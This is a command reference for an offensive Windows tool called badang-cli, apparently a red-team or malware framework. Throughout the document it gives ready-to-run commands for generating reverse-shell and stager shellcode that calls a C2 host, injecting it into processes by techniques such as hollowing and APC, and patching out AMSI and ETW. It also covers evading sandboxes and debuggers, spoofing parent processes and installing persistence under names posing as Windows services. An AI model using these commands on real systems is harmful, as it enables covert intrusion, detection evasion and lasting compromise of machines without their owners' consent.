# CLI Usage

Binary: `badang-cli.exe`

All commands default to dry-run mode. Add `-x -c` to run live.

## Commands

### Generate
```bash
badang-cli generate --type exec --command "calc.exe" -o payload.bin
badang-cli generate --type messagebox --title "Pwned" --text "Hello" -o msg.bin
badang-cli generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin
badang-cli generate --type bind_tcp --lport 4444 -o bind.bin
badang-cli generate --type stager --url https://c2.example.com/p.bin --stager-key s3cret -o stager.bin
badang-cli generate --type exec --command calc.exe --package exe -o runner.rs
badang-cli generate --type reverse_tcp --lhost 10.0.0.1 --lport 4444 --package ps1 -o loader.ps1
```

### Analyze
```bash
badang-cli analyze --pid 1234 -n          # dry run
badang-cli analyze --pid 1234 -x -c       # live scan
```

### Inject
```bash
badang-cli inject --pid 1234 --technique createremote --payload rev.bin -x -c
badang-cli inject --pid 1234 --technique apc --payload rev.bin -x -c
badang-cli inject --pid 1234 --technique hijack --payload rev.bin -x -c
badang-cli inject --technique earlybird --payload rev.bin -x -c           # no PID needed
badang-cli inject --pid 1234 --technique section --payload rev.bin -x -c
badang-cli inject --technique callback --payload rev.bin -x -c            # no PID needed
badang-cli inject --technique stomp --payload rev.bin -x -c               # no PID needed
badang-cli inject --technique hollowing --payload pe.exe -x -c            # no PID needed
```

Techniques: `createremote`, `apc`, `hijack`, `earlybird`, `section`, `callback`, `stomp`, `hollowing`

### Syscall
```bash
badang-cli syscall --func NtCreateThreadEx -n
badang-cli syscall --func NtAllocateVirtualMemory -x -c
badang-cli syscall --func NtCreateThreadEx --indirect -x -c              # Hell's Gate / Halo's Gate
```

### ETW
```bash
badang-cli etw -x -c                                    # patch EtwEventWrite
badang-cli etw --patch EtwEventWriteFull -x -c
badang-cli etw --patch NtTraceEvent -x -c
```

### AMSI
```bash
badang-cli amsi -x -c                                   # patch AmsiScanBuffer
badang-cli amsi --patch AmsiScanString -x -c
```

### Encrypt
```bash
badang-cli encrypt --payload rev.bin --method xor --key A -o encrypted.bin
badang-cli encrypt --payload rev.bin --method rc4 --key "secretkey" -o encrypted.bin
```

### PPID
```bash
badang-cli ppid --parent explorer.exe --child notepad.exe -x -c
badang-cli ppid --parent-pid 1234 --child cmd.exe --suspended -x -c
```

### Sleep
```bash
badang-cli sleep --method manual --duration 5000 -x -c
badang-cli sleep --method ekko --duration 3000 -x -c
```

### Spoof
```bash
badang-cli spoof --demo NtAllocateVirtualMemory -x -c
badang-cli spoof --demo NtCreateThreadEx -x -c
```

### Persist
```bash
badang-cli persist --method registry --name UpdateService --payload runner.exe -x -c
badang-cli persist --method service --name WindowsUpdate --payload svc.exe -x -c
badang-cli persist --method schtask --name SystemCheck --payload runner.exe -x -c
badang-cli persist --method hijack --name version.dll --target C:\App --payload ver.dll -x -c
badang-cli persist --method com --target "{CLSID}" --payload server.dll -x -c
```

Methods: `registry`, `schtask`, `wmi`, `hijack`, `com`, `service`

### Comms
```bash
badang-cli comms --channel https --host 10.0.0.1                                # dry run
badang-cli comms --host 10.0.0.1 --comms-key aabbccdd -x -c                    # live
badang-cli comms --host 10.0.0.1 --comms-key aabbccdd --interval 30000 --jitter 20 -x -c
badang-cli comms --host 10.0.0.1 --comms-key aabbccdd --sleep-obfs -x -c       # with sleep obfuscation
badang-cli comms --host 10.0.0.1 --comms-key aabbccdd --comms-port 8443 --path /api/check -x -c
```

Channels: `https` (operational), `dns` (planned), `smb` (planned)

### Loader
```bash
badang-cli loader --check all -x -c                          # run all checks
badang-cli loader --check sandbox -x -c                      # environment only
badang-cli loader --check debug -x -c                        # process inspection only
badang-cli loader --check vm -x -c                           # hardware fingerprint only
badang-cli loader --check debug --action exit -x -c          # terminate on detection
```

Categories: `sandbox` (env), `debug` (dbg), `vm` (hw), `all` (full)
Actions: `report` (default), `exit`

### Unhook
```bash
badang-cli unhook --unhook NtCreateThreadEx -x -c
```

### Convert
```bash
badang-cli convert -i "fc 48 83 e4 f0" -o payload.bin
badang-cli convert -i "\xfc\x48\x83" -o payload.bin
badang-cli convert --payload input.bin --format hex
```

### Load
```bash
badang-cli load --payload shellcode.bin
```

## Flags

| Flag | Short | Meaning |
|------|-------|---------|
| `--dry-run` | `-n` | Simulate only (default) |
| `--execute` | `-x` | Run for real |
| `--confirm` | `-c` | Required for live ops |
| `--pid` | `-p` | Target process ID |
| `--payload` | `-l` | Shellcode file |
| `--output` | `-o` | Output file |
| `--technique` | `-t` | Injection technique |
| `--func` | `-s` | Syscall function |
| `--unhook` | `-u` | API to unhook |
| `--type` | | Payload type |
| `--command` | | Command (exec) |
| `--title` | | MessageBox title |
| `--text` | | MessageBox text |
| `--lhost` | | Listener IP |
| `--lport` | | Listener port |
| `--input` | `-i` | Bytes to convert |
| `--format` | `-f` | Format: auto/hex/c/python/rust/decimal |
| `--verbose` | `-v` | Verbose output |
| `--indirect` | | Use indirect syscall (Hell's Gate) |
| `--patch` | | Target function to patch (etw/amsi) |
| `--method` | | Encrypt/sleep method |
| `--key` | | Encryption key |
| `--parent` | | Parent process name (ppid) |
| `--parent-pid` | | Parent process PID (ppid) |
| `--child` | | Child command (ppid) |
| `--suspended` | | Create suspended (ppid) |
| `--duration` | | Sleep duration in ms |
| `--demo` | | Target function (spoof) |
| `--filter` | | Process name filter (scan) |
| `--url` | | Download URL (stager) |
| `--stager-key` | | XOR key (stager) |
| `--package` | | Output format: exe/ps1/csharp/dll |
| `--name` | | Value/task/service name (persist) |
| `--target` | | Target dir or CLSID (persist) |
| `--channel` | | Comms channel: https/dns/smb |
| `--host` | | Callback host (comms) |
| `--comms-port` | | Callback port (comms, default 443) |
| `--interval` | | Callback interval ms (comms, default 60000) |
| `--jitter` | | Jitter percentage (comms, default 15) |
| `--comms-key` | | RC4 hex key (comms) |
| `--path` | | HTTP path (comms, default /api/status) |
| `--sleep-obfs` | | Enable sleep obfuscation (comms) |
| `--check` | | Loader check category: sandbox/debug/vm/all |
| `--action` | | Loader fail action: report/exit |
